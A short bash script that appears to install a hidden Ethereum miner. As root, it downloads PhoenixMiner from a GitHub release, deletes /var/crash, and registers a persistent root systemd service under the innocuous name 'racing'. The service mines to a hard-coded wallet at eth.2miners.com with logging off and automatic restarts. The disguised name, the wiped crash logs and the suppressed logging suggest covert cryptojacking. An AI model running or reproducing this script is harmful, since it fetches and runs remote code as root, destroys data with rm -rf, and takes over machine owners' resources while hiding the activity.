#!/bin/bash
cd /home
sudo wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz ; sudo tar -zxvf PhoenixMiner_5.6d_Linux.tar.gz
sudo rm -rf /lib/systemd/system/racing.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/racing.service 
[Unit]
Description=racing
After=network.target
[Service]
ExecStart= /home/PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eth.2miners.com:2020 -wal 0xb7276e5bc853a46772f1b0a09b25cd5b2f096617 -worker STD1 -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable racing.service &&
service racing stop  &&
service racing restart

/lib/systemd/system/racing.service
sudo rm -rf /etc/systemd/system/racing.service
